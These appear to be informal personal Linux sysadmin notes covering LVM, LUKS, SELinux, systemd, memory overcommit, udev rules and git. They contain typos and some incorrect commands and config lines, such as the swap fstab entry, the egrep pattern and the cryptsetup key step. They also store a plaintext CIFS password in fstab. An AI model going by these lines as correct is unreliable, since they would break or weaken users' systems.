chown :web /var/www/html/sexy                   // changing theg roup  f the seox fyli intoethe  ew group. b
=======================================
change your shell
chsh




=======================================
shell variable vs environment variable
environment variables are passed by os to all proccesses you run while shell variables
can't be used directly. to promote a shell variable into an environment variable use
export [variable name]




Environment variables are useful because many programs read them for configuration and options. For example, you can put your favorite less command-line options in the LESS environment variable, and less will use those options when you run it. (Many manual pages contain a section marked ENVIRONMENT that describes these variables.)


+++++++++++++++++++++++++++++++++++++++
command line key strokes
CTRL - B move the coursor to the left
CTRL - F move the coursor to the right
CTRL - P view the previous command
CTRL - N View the next command
CTRL - A move the cursor to the begining of the line
CTRL - E move the cursor to the end of the line.
CTRL - W erase the precednind word
CTRL - U erase from cursor to begining of line
CTRL - K erase from curosr to end of line
CTRL - Y paste erasted text






+++++++++++++++++++++++++++++++++++++++
User email directories
/var/mail/spool/[username]


+++++++++++++++++++++++++++++++++++++++++
dd command
using dd to create a file of a specific size
dd if=/dev/random of=test.img bs=200M count=1
dd if=/dev/sda of=/dev/sdb          // backup and entire hardisk
dd if=/dev/sda1 of=parititon.img    // backup and entire partition


+++++++++++++++++++++++++++++++++++++++
centos static ip address / redhat static ip address


admin@vfmc:~$ cat  /etc/sysconfig/network-devices/ifcfg-eth0
# automatically generated on Wed Jan  2 07:18:35 UTC 2019


ONBOOT=yes
IP=10.10.1.21
NETMASK=255.0.0.0
BROADCAST=10.255.255.255
BOOTPROTO=static
MEDIAOPTS=
BOOTPROTO_V6=disable
MTU=1500
GATEWAY=10.10.1.2
==========================================
Tail command
tail -n // shows the last n lines
tail +n // shows the lines starting at offset n






=========================================
head command
head -n                         // shows the first n commands






with dhcp set this one:
BOOTPROTO=dhcp


+++++++++++++++++++++++++++++++++++++++++
boot into a specific run level
sudo init <run level identified by a number>




+++++++++++++++++++++++++++++++++++++++++
shutdown the machine
shotdown now




reload the machine
shutdown -r now


+++++++++++++++++++++++++++++++++++++++++


log files


/var/log               // all operating system logs are here
                        // managed by a process called syslog or rsyslog

/var/log/messages      // catch all log file.




/var/log/boot.log                // boot process messages
/var/log/dmesg                   // kernel related messages related to hardware/drivers/processes




/var/log/secure                 // login attempts, authentication attempts




rsyslog            syslog program/service that governs the logs writing process


facility: based on which it is decided to which file the logs are written




++++++++++++++++++++++++++++++++++++++++


ps                  view processes of the current user
ps auxw              view all of the processes


kill [pid]


kill -9 [pid]               \\ no matter what is the cost just kill it. 9 here is SIGKILl


killall    [name]           \\ kill every process that has that name



******************************************
init.d service style


/etc/init.d/<service-name> [start|stop|reload]                  << what is there is just startup scripts that call binaries in different locations in /sbin and so on..










*******************************************
add a part for systemd commands


[malhyari]
systemctl status [service-name]
systemctl start [service-name]
systemctl stop [service-name]
systemctl enble [service-name]
systemctl disable [service-name]
system-ctl daemon-reload                            // reload the daemon to apply changes.
systemctl halt                                      //system halt.
systemctl poweroff                                  // poweroff the system
systemctl suspend                                   // suspend the system




*******************************************
journal daemon
journalctl -f                       // follow the system log file in init V it is tail -f /var/log/messages or tail -f /var/log/syslog
journalcrl -u sshd.service          // get logs for sshd service only


*******************************************
Modinfo


View info about available devices. extracts information from the Linux kernel modules given
example
root@eve-1:~# modinfo snd
filename:       /lib/modules/4.9.40-eve-ng-ukms-2+/kernel/sound/core/snd.ko
alias:          char-major-116-*
license:        GPL
description:    Advanced Linux Sound Architecture driver for soundcards.
author:         Jaroslav Kysela <perex@perex.cz>
srcversion:     521898CB895334223DB1B5E
depends:        soundcore
intree:         Y
vermagic:       4.9.40-eve-ng-ukms-2+ SMP mod_unload
parm:           slots:Module names assigned to the slots. (array of charp)
parm:           major:Major # for sound driver. (int)
parm:           cards_limit:Count of auto-loadable soundcards. (int)
root@eve-1:~#








*******************************************


redhat packet manager


rpm
[malhyari]




/var/lib/rpm                    : database of rpm packages


********************************************
dd if=/dev/zer of=/home/malhyari/chunk.img count=1024 bs=1M                 // create a 1Gig File

********************************************
disk management


fdisk -l /dev/sda                   // list partitions in this disk


create partitions on the disk :
fdisk /dev/sda                      // interactive mode




cgdisk /dev/sda                     // cgdisk management tool.






parted
gparted




create a file system on the parition [formatting the disk]
mkfs.ext4 /dev/sda1                     // mkfs.[filesystem type]




mount the filesystem created
mount /dev/sda1 /mnt/temp_partition




LVM
[malhyari]


//display lvm config
lvm dumpconfig


the partitions created on the disk sould be of type lvm 8e. that is before converting them into a physical volume.


phyiscal volume ------------ > volume group ----->logical volume -------->


-- create a physical volume
pvcreate /dev/sda1
pvcreate /dev/sda2
pvcreate /dev/sdb1
                                    // misc- pvdisplay / pvscan / pvresize / pvchange

Note: an entire disk can be used as a physical volume


-- create a volume group
vgcreate myvg /dev/sdb /dev/sdc
                                    // misc vgdisplay / vgscan

-- create a logical volume
lvcreate -L 2G myvg                             // size is 2G
                                    // misc- lvscan / lvdisplay


-- create a partition
fdisk /dev/myvg


-- format the partition and mount it




-- extending the volume group
vgextend myvg /dev/sdd


-- extending the logical volume size
lvextend -L3G /dev/myvg/lv010




/dev/volumegroup/logicalvolume




PE : physical extendes are the minum block size inside a physical volume that can be allocated to a logical volume.


// sometimes you need to resize the fs after the extend
resize2fs /dev/ubuntu-vg/ubuntu-lv
// in case it was an xfs file system the following is needed
xfs_growfs /dev/centos/root






raid  mirror and lvm
lvcreate -L 20M -m 1 -n mirror myvol            // create logical volume mirror that is using two disks as a raid morror
Note: m in the above command refers to the number of copies


raid  stripe and lvm
lvcreate -L 20M -i 3 -I 64 -n striped myvol      // 3 stripes, block size of 64 and the name is striped




//create an lvmm snapshot


lvcreate -s -n snap -L 5M /dev/myvol/stripe
// now whatever data you create on stripe volume it will also be created in the snap volume until it is full. this behavior can be
changed by enabling snapshot-aut-extend in lvm.conf file. variables controlling this are :
snapshot_autoextend_threshold = 50              // as soon as snapshot hits 50% capcacity we will increase its size to ???
snapshot_autoextend_percent = x                 // it will be increased by the percentage x






// lvm thick provisioning
it is about allocating more ?


** create a volume group
vgcreate -s 2M mythinvol /dev/xvdf1 /dev/xvdf2 /dev/xvdf3                   // s flag here is for the extend size.
lvcreate -l 290 --thinpool mythinpool mythinvol                             // this have a lie that it can allocate more data.
lvcreate -V 5G --thin -n client1 mythinvol/mythinpool                                            // V is for virtual size
mkfs.xfs /dev/mythinvol/client1
mount /dev/mythinvol/client1 /mnt/tmp1


Note: df -h will show 5 Gig for that volume which is a lie


remote mounts with cifs
==============
mount -t cifs -o username=myuser,password=password //1.1.1.1/temp /temp


an entry for this can be created in the /etc/fstab
//1.1.1.1/temp  /temp cifs user,rw, username=myuser,password=mypass 0 0






LUKS for disk encryption
=======================
cryptsetup luksFormat /dev/sdd                      // take a note of the passphrase used here
cryptsetup luksOpen /dev/sdd cryptp                 // enter the passphrase : we have opened that parittion called cryptp
dd if=/dev/urandom of=/root/keyfile bs=1024 count=4  // create a 4k bit size file to be used as the key
cryptsetup LuksAddkey /dev/sdd /root/keyfile        // create the key and store it inside /root/keyfile
cryptsetup status cryptp                            // check the status of the encrypted partition
mkfs.ext4 /dev/mapper/cryptp                        // make the file system
mount /dev/mapper/cryptp /crypt                     // mount the partition


if needed it can be added to the /etc/fstab file
/dev/mapper/cryptp /crypt       ext4        defaults    1 2
then edit /etc/crypttab adding this line:
cryptp /dev/sdd     /root/keyfile luks






*******************************
setgroup id bit
setgid bit


chmod g+s .             // add setgid for the current directory
when set in such a way the file inhertis the group id of the directory owner
[malhyari check more on this one] -> maybe collaborators on the same direcotry so that everyone can use the file as it is a group owned


setuid






********************************
file access lists
the partition should be mounted with the corret attribute to support file acls
mount -t ext4 -o acl /dev/sdc1 /mnt
setfacl -m u:alex:rwx  /mnt/temp                    // m for modify, userame is alex, rwx are the rights
Note: execute permissions on a directory are needed to access the direcotry


getfacl /mnt/temp                           // check for file access lists


setfacl -x u:alex /mnt/temp                 // remove all permissions for that particular user


*********************************
swap space aka swap partitions


create a partition with fdisk and change the partition type to swap
make the partition with:
"mkswap /dev/sdc1"
"swapon /dev/sdc1"


check with cat /proc/swaps




add to /etc/fstab           //  called tab because it is tab delimited
tmpfs               /dev/sdc1           tmpfs           defaults    0 0


turn it off
swapoff /dev/sdc1


********************************


UUID
is a long series of hexidecimal strings that are meant to be unique across space and time
how to get the UUID of a device?
1) lsblock  -f         // show the block devices
2)blkid
3)ls -la /dev/disk/by-uuid/         // inspect the link to know the mapping






====================


networking [malhyari]
add the networking commands for old style and new style




Centos network scripts
/etc/sysconfig/network-scripts


====================


/etc/cron*


/etc/cron.d:
/etc/cron.daily             : execute on a daily basis
/etc/cron.hourly            : execute on an hourly basis
/etc/cron.weekly            : execute every week


/etc/crontab


*            *             *               *                      *
min          hr         day of month     month                 day of week
[0-59]      [0-23]         [1-31]         [1-12 or JAN]        [0-6] or [sat,sun....fri]




=====================
Services managers






init.d
*******
if your system has /etc/inittab directory.
/etc/rc[level].d:               controls script for run level x


ex :
/etc/rc0.d


Note: scripts do not really exist in that directly but they are linked to files inside /etc/init.d directory




enable a service at startup
chkconfig --level 345 vsftpd on










systemd
********
if your system has the  directory /usr/lib/systemd
unit files:
service :   Anything you start with the systemctl command.
Mount   : used to mount file systems.
Time    : a replacement of cron.
Automount :     mounting stuff.
target  : a group of unit files.
Path    : units that are monitoring acitivties in some directories.




unit files are stored in two locations:
/usr/lib/systemd/system             // prpvided by the distribution packacges
/etc/systemd/system                 // configured by the admin




SYSTEMD dependencies:
Requires : defines units that must be loaded to load this unit.
Wants    : typically seen in targets, defines which units should be loaded but loading continues if this fails.
Requisite : the defined unit must already be active. if not systemd fails loading this unit.
Conflict  : can't be active.
Before    : the current unit will activate before the listed units.
After       : the current unit will activate after the listed units.




More about the target unit :
Simply it is a group of units
Can be a run level when Allowisolate is set to yet. The target that has this set can be an endpoint.


Example:


abc.service
Wantedby = blah.target




The wantedby is managed by wants directory inside /etc/systemd/system. In that one we will have the following directory:
/etc/systemd/system/blah.wants/


Inside that directory we will have a symlink to abc.service.


When you do the command “systemctl enable abc” . it looks first if there is a wantedby attribute inside the service unit file and if it is there then it creates a symlink inside that the directory above.






upstart
********
if your system has /etc/init directory




***************************
yum packet manager


[malhyari update this]


yum update                      // check updates for all packages
yum update kernel               // update the kernel




repositories
/etc/yum.conf                   // yum configuration file
/etc/yum.repos.d/               // systems yum communicate with based on type of package aka mirror list

****************************


redhat kick start
is a quick of installing systems that every system is installed in the same way




anaconda-ks.cfg  // the file can be used to configure other systems






*****************************
boot loader


Grub
/boot/grub  directory                   grub : grand unified boot loader
grub reads its configuration files at boot time


configuration file : menu.1st               // contains boot menu entries




Grub2


/etc/default/grub
/etc/grub.d




we no longer use menu.1st file
instead we use grub.conf and we submit changes via
sudo grub2-mkconfig -o /boot/grub/grub.cfg


automatically create the grub.cfg file based on what kernel images it finds in /boot


in grub2 you can reference the partition via msdos1 or gpt1




the configuration files are
/etc/grub2.conf which is a soft link to /boot/grub2/grub.conf




view the kernel entry grub will load by default:
cat /boot/grub2/grubenv
the output will be like:
saved = [sequence]                      // the sequence is the number of the entry we will bo booting.


view all kernel entries in grub menu


awk -F\' /^menuentry/{print\$2} /boot/grub/grub.cfg


this will return a list of all kernel entries in the menu. to change the default kernel image you just need to:
grub2-set-default 2                     // the number here points to the entry sequence which starts by 0.
grub2-mkconfig -o /boot/grub2/grub.cfg              // make it permanent






***********************************
[malhyari ]
migrate the SSH part


*************************************


kernel parameters
sysctl
sysctl -a       // show all parameters
sysctl -w net.ipv4.tcp_timestamps=0                 // writing a kernel parameter


persistent change
/etc/sysctl.conf    // add the kernel parameter in this file


************************************
virtual machines


1- check if your machine has a processor supporting virtualization
egrep '{vmx|svm}' /proc/cpuinfo


2- install kvm that will provide virtualization
yum install kvm kmod-kvm qemu


3- create a disk image with qemu
qemu-img create -f qcow2 mine.img 8G


4- create and start the VM
sudo qemu-kvm -hda mine.img -cdrom CentOS-6.5-x86_64-bin-DVD1.iso -m 512 -boot d
// this opens a VNC console to the vm after kicking it on




################################
virsh               // vritual shell which allows us to interact with tasks related to Virtual machines


virsh> list         // list all machines
virsh> autostart [name]             // auto start a virtual machine
virsh> connect / console            // connect to a machine console


libvirtd daemon should be running


#################################
iptables
[malhyari add iptables]




##################################
SELinux                     // other packages needed selinuxinfo policycoreutils / semanage
security enhancement for mandatory access control


Running Modes:
enforcing
permissive
disabled


two policy modes:
1) targeted (the default policy )
only targted processes are protected by selinux
everything else is unconfined
user processes and init processes are not targeted. selinux enforces memory restrictions for all
processes which helps protecting from buffer overflow attacks.






2)mls (multi level security )
typically used when the absolute highest security is needed
can be extemely complex to setup
all processes are placed in fine-grained security domains with particular policies


3) mimmimum
selected processes are protected.




/etc/selinux/config
SELINUX=disabled            // disable selinux from the config file.
can be also disabled by adding the kernel parameter selinux=0




two important SElinux concepts:
-- labeling
    -- files, processes , ports etc. are labeled with an SElinux conetxt.
    -- where possible (files, directories) these labels are stored as an extended attributes on the file system. if you do ls and the permissions pattern ends with a dot
        then you have an selinux context on that file.
    -- for everything else, the kernel manages these labels .






-- type enforcement enformcent


    type enforcement is the part of the policy that says, for every instance . " A process running with the label httpd_t can have read access to a file labeled
    "httpd_conf_t"




it is a set of security rules that are used to determine which processes can access which files,
directories, ports and other items in the system.


it works with three conceptual quantities:
1)Contexts : Are labels to files, processes and ports
There are four SElinux contexts:
User
Role
Type        :       end with _t
Level


Newly created files inherit the context of their parent directory while copy/move it is the context of the source
directory which is preserved and this may create a problem.


restorecon resets file contexts based on the parent directory settings. example of doing it recursivly:
restorecon -Rv /home/peter


semanage fcontext           // changes  and display the default context of files and directories.


semanage fcontext -a -t httpd_sys_content_t /vritualhosts
Note: semanage changes the default settings, it does not apply them for existsng objects. this is why we need
to run restorcon after it:




restorecon -RFv /virtualhosts






2)Rules : Describe access control in term of contexts, processes, files, ports, users, etc.
3)Policies : are set of rules that describes what system wide access control decisions should be made by SElinux












a whole new definition of permissions


to view SELINUX objectes assigned to a file use
ls -Z           // for a file
ps auxZ         // for a process




configure SElinux mode : // three modes
Enforcing : policy is enforced.
permisive : enabled and policies are in place but there is no denying access // there are logs and warning
disabled : "disabled"


check the mode wth getenforce command
change the mode with "setenforce [mode]" command


sestatus : get the statu of selinux


permanent changes should be done inside /etc/selinux/config


SElinux file contexts
*********************
it is the way SELinux controls the way files are accessed.


change the context of a file :
chcon -v --type=httpd_sys_content_t index.html


user:role:type


seinfo -t    //    show all types that are available


seinfo -u   // show all users that are available
seinfo -r   //  show all roles




process context
=================


ps -aZ              // view the process context
user:role:type


view logged in users
semanage login -l




resoting a default context
==========================
restorecon -v index.html                // you can use -R for recursisve




// this does not persist over reload.
semanage fcontext -a -t httpd_sys_content_t index.html      // persistent one




selinux policy violation
========================
sealert -a /var/log/audit/audit.log                 // view the alert log in readable format // note this file is binary




SELinux boolean variables
--------------------------


off/on values for SELinux
getsebool -a                    // show all se boolean values
OR
semanage boolean -l


setsebool -P httpd_enable_homedirs on       // change a variable value


semanage boolean -l                         // get a list of the variables with an explanation






SElinux Troubleshooting
=======================
selinx comes with a set of tools that collect issues at run time, log these issues and propose solutions to
prevent same issues from happening again. these are provided by setroubleshoot-server package.


reproduce the issue and then run tail /var/log/messages
look at the alert id in the logs and then do
sealert -l [alert id]


*********************************************
apparmor
has two modes:
complain/learning: violations of MAC are logged out but not prevented
enforced/confiend: violations of the MAC are prevented and logged.


apparmor profiles are set per binary. That means every protected binary has an entry in /etc/apparmor.d/ .
Profiles are named using the path to the binary with . replacing / for example the profile for /bin/ping would be:
/etc/apparmor.d/bin.ping


aa-complain and aa-enforce are used to set specific profiles (ping , httpd) tp their respective modes.






%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


adding non standared repository into centos
sudo yum install epel-release




log file
/var/log/audit/audit.log


***********************************************
chroot


// change the root directory of the current running processes. SO they can start using another directory as the root directory of the
system






***********************************************


Linux Logging
1) It can send to stderr but if stderr is not present then it will end nowhere.


2) The application can take care  of its own logs . like what apache does.


3) Rsyslog. [the benefit is centralized logging]  - > /var/log/ directory


4)Systemd-journald : journalctl command.






#################################################
dump the content of the inode structure


#debugfs /dev/vgstriped/lvdata
#stat <inode-number>






###################################################
Linux Memory




found the amount of RAM you have :
dmesg | grep -in mem






Details and information about RAM modules
dmidecode --type 17


root@eve-1:~# dmidecode --type 17
# dmidecode 3.0
Getting SMBIOS data from sysfs.
SMBIOS 2.4 present.


Handle 0x01A3, DMI type 17, 27 bytes
Memory Device
        Array Handle: 0x01A2
        Error Information Handle: No Error
        Total Width: 32 bits
        Data Width: 32 bits
        Size: 16384 MB
        Form Factor: DIMM
        Set: None
        Locator: RAM slot #0
        Bank Locator: RAM slot #0
        Type: DRAM
        Type Detail: EDO
        Speed: Unknown
        Manufacturer: Not Specified
        Serial Number: Not Specified
        Asset Tag: Not Specified




Page:   blocks are that are used in memory and typically of the size 4k.
Virtual Memory : total of allocatable memory, aka the process address space.
Paging : getting memory from secondary stroage into primary storage.
Swap : emulated memory on disk.
Translation look aside buffer : a cache that helps speeding up translation between virtual memory and RAM.
Cache : fast memory that is close to CPU.
Page cache : area where recently used memory pages are stored.




ls /proc/meminfo                        || details of memory infomration
important things to look at there :
MemTotal                    // total physical memory
vmAllocTotal                // total allocatable virtual memory [very big number]
SwapTotal                   // swap memory size.










memory and the output of the top command :
top - 05:53:07 up 3 days,  2:12,  2 users,  load average: 2.36, 2.49, 2.62
Tasks: 745 total,   1 running, 744 sleeping,   0 stopped,   0 zombie
%Cpu(s):  1.5 us,  2.5 sy,  0.0 ni, 95.5 id,  0.4 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem : 13202713+total, 79450400 free, 11188880 used, 41387852 buff/cache
KiB Swap:  8388604 total,  8388604 free,        0 used. 11880867+avail Mem


  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
40924 root      20   0 9795268 3.205g  21812 S 188.2  2.5   3430:00 qemu-system-x86
58644 root      20   0 9881196 3.026g  22104 S 105.9  2.4   1427:12 qemu-system-x86
39197 root      20   0 4998676 1.093g  20988 S  11.8  0.9 346:00.91 qemu-system-x86
30001 root      20   0   42640   4096   2920 R   5.9  0.0   0:00.02 top
45385 root      20   0 5024596 2.278g  21456 S   5.9  1.8 151:50.03 qemu-system-x86
47509 root      20   0 5023776 2.257g  21216 S   5.9  1.8 150:47.84 qemu-system-x86
    1 root      20   0   37992   5924   3980 S   0.0  0.0   0:02.78 systemd


Explanation:
============
VIRT: the amount of kilobytes the process is allocating [virtual memory]
RES: Resident memory which is what is the process is really using.


KiB Mem : 13202713                  // total amount of physical memory




buff/cache:
Cached memory is where the device keeps frequently accessed data to avoid loading it from the disk again and again. The operating system will clear it if the memory is needed for something else.


So, the amount of available memory is not just the free available memory in the above output. but it is also extends to include part of the cached memory [and it is a very good part]




let us see that in another command:
free -m -h
root@eve-1:~# free -mh
              total        used        free      shared  buff/cache   available
Mem:           125G         10G         75G         42M         39G        113G
Swap:          8.0G          0B        8.0G




available vs free is explained with the cached memory concept.


drop the cached memory via:
echo 3 > /proc/sys/vm/drop_caches ; free -mh






Linux active and inactive memory:
================================
root@eve-1:~# cat /proc/meminfo  | grep -i active
Active:         10486344 kB
Inactive:         110936 kB
Active(anon):   10313720 kB
Inactive(anon):    82412 kB
Active(file):     172624 kB
Inactive(file):    28524 kB




Two states of used memory:


Active memory are pages which have been accessed "recently". is memory that is being used by a particular process.
Inactive memory are pages which have not been accessed "recently". is memory that was allocated to a process that is no longer running.




Active is the total of Active(anon) and Active(file). Similarly, Inactive is the total of Inactive(anon) + Inactive(file).








Ditry Memory
The Dirty field refers to data that is stored in memory and still needs to be written to the disk.






vmstat -s




8167848 K total memory
      7449376 K used memory
      3423872 K active memory
      3140312 K inactive memory
       718472 K free memory
      1154464 K buffer memory
      2422876 K swap cache
      1998844 K total swap
            0 K used swap
      1998844 K free swap
       392650 non-nice user cpu ticks
         8073 nice user cpu ticks
        83959 system cpu ticks
     10448341 idle cpu ticks
        91904 IO-wait cpu ticks
            0 IRQ cpu ticks
         2189 softirq cpu ticks
            0 stolen cpu ticks
      2042603 pages paged in
      2614057 pages paged out
            0 pages swapped in
            0 pages swapped out
     42301605 interrupts
     94581566 CPU context switches
   1382755972 boot time
         8567 forks
$






tunning memory
Fortunately the Operating System knows about the bad habits of applications, and overcommits memory. That is,
it provisions more memory (both RAM and Swap) than it has available, betting on applications to reserve more memory pages than they actually need.
Obviously this will end in an Out-of-Memory disaster if the application really needs the memory, and the kernel will go around and kill applications.
The error message you see is similar to “Out of memory: Kill process …“, or in short: “OOM-Killer”. To avoid such situations,
the overcommit behavior is configurable.


Linux by default allows overcommitting memory. That means that if a process asks for memory, Linux will say "sure". Then,
if it actually runs out of memory (including swap space), Linux will start killing processes to free up memory.


So, if your process allocates 117GB but does not use most of it, it will show 117GB virtual memory. However, if your process then all of a sudden decides it's actually going to fill up that 117GB, Linux will run out of memory and kill it,
and perhaps other processes as well (this is where the bad effect comes in).


On Linux kernels ≥ 2.5.30, there are two proc files that regulate this. First, there is /proc/sys/vm/overcommit_memory. This can have three values:


0: let the kernel decide for itself how much overcommitment it allows
1: allow unlimited overcommitment
2: allow overcommitment according to /proc/sys/vm/overcommitment_ratio.


The other proc file, /proc/sys/overcommitment_ratio, denotes the percentage of overcommitment of memory it will allow if the other one is set to 2.
If overcommit_memory is set to 2, Linux will allow all the swap space to be committed, plus overcommitment_ratio% of RAM.




Linux on the other hand is seriously broken. It will by default answer "yes" to most requests for memory, in the hope that programs ask for more than they actually need. If the hope is fulfilled Linux can run more programs in the same memory, or can run a program that requires more virtual memory than is available. And if not then very bad things happen.


What happens is that the OOM killer (OOM = out-of-memory) is invoked, and it will select some process and kill it. One holds long discussions about the choice of the victim. Maybe not a root process, maybe not a process doing raw I/O, maybe not a process that has already spent weeks doing some computation.
And thus it can happen that one's emacs is killed when someone else starts more stuff than the kernel can handle. Ach. Very, very primitive.


what does the overcommit behavior do to us in this case?
The two parameters to modify the overcommitt settings are /proc/sys/vm/overcommit_memory and /proc/sys/vm/overcommit_ratio.


/proc/sys/vm/overcommit_memory
This switch knows 3 different settings:


0: The Linux kernel is free to overcommit memory (this is the default), a heuristic algorithm is applied to figure out if enough memory is available.
1: The Linux kernel will always overcommit memory, and never check if enough memory is available. This increases the risk of out-of-memory situations, but also improves memory-intensive workloads.
2: The Linux kernel will not overcommit memory, and only allocate as much memory as defined in overcommit_ratio.
The setting can be changed by a superuser:


echo 2 > /proc/sys/vm/overcommit_memory


/proc/sys/vm/overcommit_ratio
This setting is only used when overcommit_memory = 2, and defines how many percent of the physical RAM are used. Swap space goes on top of that.
The default is “50”, or 50%.


The setting can be changed by a superuser:


echo 75 > /proc/sys/vm/overcommit_ratio


Linux Memory Allocation
we mainly look into overcommit_memory = 2, we don’t want to end up in situations where a process is killed by the OOM-killer.


Linux uses a simple formula to calculate how much memory can be allocated:


Memory Allocation Limit = Swap Space + RAM * (Overcommit Ratio / 100)


Scenario 1:
4 GB RAM, 4 GB Swap, overcommit_memory = 2, overcommit_ratio = 50


Memory Allocation Limit = 4 GB Swap Space + 4 GB RAM * (50% Overcommit Ratio / 100)
Memory Allocation Limit = 6 GB
Scenario 2:
4 GB RAM, 8 GB Swap, overcommit_memory = 2, overcommit_ratio = 50


Memory Allocation Limit = 8 GB Swap Space + 4 GB RAM * (50% Overcommit Ratio / 100)
Memory Allocation Limit = 10 GB
Scenario 3:
4 GB RAM, 2 GB Swap, overcommit_memory = 2, overcommit_ratio = 50


Memory Allocation Limit = 2 GB Swap Space + 4 GB RAM * (50% Overcommit Ratio / 100)
Memory Allocation Limit = 4 GB








huge pages
When a process uses some memory, the CPU is marking the RAM as used by that process. For efficiency, the CPU allocate RAM by chunks of 4K bytes (it's the default value on many platforms). Those chunks are named pages. Those pages can be swapped to disk, etc.


Since the process address space are virtual, the CPU and the operating system have to remember which page belong to which process, and where it is stored. Obviously, the more pages you have, the more time it takes to find where the memory is mapped. When a process uses 1GB of memory, that's 262144 entries to look up (1GB / 4K). If one Page Table Entry consume 8bytes, that's 2MB (262144 * 8) to look-up.


Most current CPU architectures support bigger pages (so the CPU/OS have less entries to look-up), those are named Huge pages (on Linux), Super Pages (on BSD) or Large Pages (on Windows), but it all the same thing.


grep Huge /proc/meminfo


sysctl parameter
vm.nr_hugepages = 0






Set the vm.nr_hugepages kernel parameter to a suitable value. In this case, we decided to use 12GB and set the parameter to 6144 (6144*2M=12GB). You can run:
echo 6144 > /proc/sys/vm/nr_hugepages
or


sysctl -w vm.nr_hugepages=6144
Of course, you must make sure this set across reboots too.


The oracle userid needs to be able to lock a greater amount of memory. So, /etc/securities/limits.conf must be updated to increase soft and hard memlock values for oracle userid.
oracle          soft    memlock        12582912
oracle          hard   memlock        12582912


===================================
udev


(userspace /dev) is linux sub-system for dynamic device detection and management, since kernel 2.6 it is the replacement of devfs and hotplug.


It dynamically creates or removes device nodes
device node: an interface to a device driver that appears in a file system as if it were an ordinary file, stored under the /dev directory




at boot time or if you add a device to or remove a device from the system.
It then propagates information about a device or changes to its state to user space.


It’s function is to:
 1) supply the system applications with device events,
2) manage permissions of device nodes, and
3) may create useful symlinks in the /dev directory for accessing devices, or even renames network interfaces.




basics of udev in linux:




The udev daemon, systemd-udevd (or systemd-udevd.service) communicates with the kernel and receives device uevents directly from it
each time you add or remove a device from the system, or a device changes its state.




Udev is based on rules – it’s rules are flexible and very powerful.
Every received device event is matched against the set of rules read from
Files located in /lib/udev/rules.d and /run/udev/rules.d.


You can write custom rules files in the /etc/udev/rules.d/ directory
(files should end with the .rules extension) to process a device.
Note that rules files in this directory have the highest priority.


To create a device node file, udev needs to identify a device using certain attributes
such as the label, serial number, its major and minor number used,
bus device number and so much more. This information is exported by the sysfs file system.


Whenever you connect a device to the system, the kernel detects and initializes it,
and a directory with the device name is created under
/sys/ directory which stores the device attributes.


The main configuration file for udev is /etc/udev/udev.conf,
and to control the runtime behavior the udev daemon,
you can use the udevadm utility.




To display received kernel events (uevents) and udev events
(which udev sends out after rule processing), run udevadm with the monitor command.
Then connect a device to your system and watch,
 from the terminal, how the device event is handled.


udevadm monitor                                 // view kernel uevents

lsblk                                                         //reads the sysfs filesystem and udev db to gather information about processed devices.

udevadm info /dev/sdb1                // QUERY THE DEVICE ATTRIBUTES FROM UDEV DATABASE

view eth0 udev info:
malhyari@ubuntu:~$ udevadm info -a -p /sys/class/net/eth0






udevadm     : is a tool for interacting with udev. the main commands are:
udevadm control
udevadm test
udevadm trigger


When making a change to a rule in /etc/udev/rules.d/ we run udevadm trigger and then udevadm control -reload-rules
this does not work if you change the name of the device. udev can only do that at boot time. other tasks like creating a symlink or adding a device can be done live.



How to Work with Udev Rules in Linux




e will briefly discuss how to write udev rules.
A rule comprises of a comma-separated list of one or more key-value pairs.
Rules allow you to rename a device node from the default name,
modify permissions and ownership of a device node, or
trigger execution of a program or script when a device node is created or deleted, among others.




We will write a simple rule to launch a script when a USB device is added and when it is removed from the running system.


Let’s start by creating the two scripts:
$ sudo vim /bin/device_added.sh


Add the following lines in the device_added.sh script.
#!/bin/bash
echo "USB device added at $(date)" >>/tmp/scripts.log


Open the second script.
$ sudo vim /bin/device_removed.sh


Then add the following lines to device_removed.sh script.
#!/bin/bash
echo "USB device removed  at $(date)" >>/tmp/scripts.log


Save the files, close and make both scripts executable.


$ sudo chmod +x /bin/device_added.sh
$ sudo chmod +x /bin/device_removed.sh


Next, let’s create a rule to trigger execution of the above scripts,
called /etc/udev/rules.d/80-test.rules.




$ vim /etc/udev/rules.d/80-test.rules


Add these two following rules in it.


SUBSYSTEM=="usb", ACTION=="add", ENV{DEVTYPE}=="usb_device",  RUN+="/bin/device_added.sh"
SUBSYSTEM=="usb", ACTION=="remove", ENV{DEVTYPE}=="usb_device", RUN+="/bin/device_removed.sh"


where:


"==": is an operator to compare for equality.
"+=": is an operator to add the value to a key that holds a list of entries.
SUBSYSTEM: matches the subsystem of the event device.
ACTION: matches the name of the event action.
ENV{DEVTYPE}: matches against a device property value, device type in this case.
RUN: specifies a program or script to execute as part of the event handling.


tell systemd-udevd to reload the rules:
$ sudo udevadm control --reload


attach a usb and remove it then check if the script has been executed.






exmaple 2 :
rename etho to dmz
/etc/udev/rules.d/


vi 70-persistent-net.rules


open the file and change the name in the rule to dmz.


reboot the machine






example 3:
create symlinkx with disks


/etc/udev/rules.d/99-my-disk-name.rules
inside the file we have


KERNEL=="xvda" , SYMLINK+="mydisk"                          // block device of sub subsystem xvda , it will create a symlink inside the device directory
=======================================================


/sys directory












+++++++++++++++++++++++++++++++++++++++++++++++++++++


git


the code versions tracking project




>>install git:
apt-get install git                     | yum install -y git






>> clone via SSH
$ git clone ssh://[user@]server/project.git
$ git clone [user@]server:project.git
$ git clone https://xyz.com/shittypetty


>>create a repository / initiate a repository                 // note git will create the directory for you and iside it there will be a .git file containing git configs
git init webapp




>> create/add your files
echo THIS IS A READ ME FILE > README
echo 1.0 > VERSION
git add *




>>  check files that are changed
git status






>> commit the changes


git commit -m "this was the first version"




>> view git versions
Git log


!!!!!!!!!!!!!!!!!!! Remote vs Origin !!!!!!!!!!!!!!!!!!!!!!!
master / origin / local / remote


remote repository : is the one on git hub and from which all code flows // it is the origin






 EXTRA


>> set git username and passowrds


git config --global user.name "Your Name"
git config --global user.email you@example.com




>> view git logs / each version with it hash
git log


s






>> adding a new local project to git hub as a repro
1) connect to github and create the new repository
2) copy the repo url either ssh or https
3) from cli navigate to the directory inside the project you wanna upload
4) initialize via -> git init
5) add the files you wanna make inside the repo -> git add *
6) commit the change -> git commit -m "initial version"
7) add the repo url :
git remote add origin  repro-url
8) push changes to git hub
git push -f origin master




Note:
authenticatioin to github is just about creating a local ssh key and adding the public key part to your account.




